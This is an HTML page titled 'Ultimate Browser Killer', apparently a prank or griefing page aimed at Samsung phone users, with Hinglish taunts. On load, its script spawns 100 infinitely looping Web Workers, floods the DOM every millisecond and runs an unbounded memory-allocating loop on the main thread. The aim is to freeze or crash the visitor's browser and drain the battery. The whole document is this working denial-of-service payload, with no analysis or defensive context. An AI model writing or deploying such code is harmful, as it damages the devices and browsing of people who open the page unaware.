<!DOCTYPE html>
<html>
  <head>
    <title>Ultimate Browser Killer</title>
    <script>
      function createUltraCrasher() {
        const blob = new Blob([`
          onmessage = function() {
            while (true) {
              let data = [];
              for (let i = 0; i < 100000; i++) {
                data.push(Math.random());
              }
            }
          }
        `], { type: 'application/javascript' });

        const worker = new Worker(URL.createObjectURL(blob));
        worker.postMessage('start');
      }

      function spamDOM() {
        setInterval(() => {
          let div = document.createElement("div");
          div.innerText = "Samsung is worst company ever! Crash incoming!";
          document.body.appendChild(div);
        }, 1);
      }

      window.onload = function () {
        // DOM Spam
        spamDOM();

        // Create 100 heavy workers
        for (let i = 0; i < 100; i++) {
          createUltraCrasher();
        }

        // Main thread infinite RAM hog
        let arr = [];
        while (true) {
          for (let i = 0; i < 10000; i++) {
            arr.push(new Array(1000).fill("Samsung = Lag!"));
          }
        }
      };
    </script>
  </head>
  <body>
    <h1>BHAI! Yeh Samsung ka phone gaya kaam se!</h1>
    <p>Browser... Battery... Sabko bye bol de!</p>
  </body>
</html>
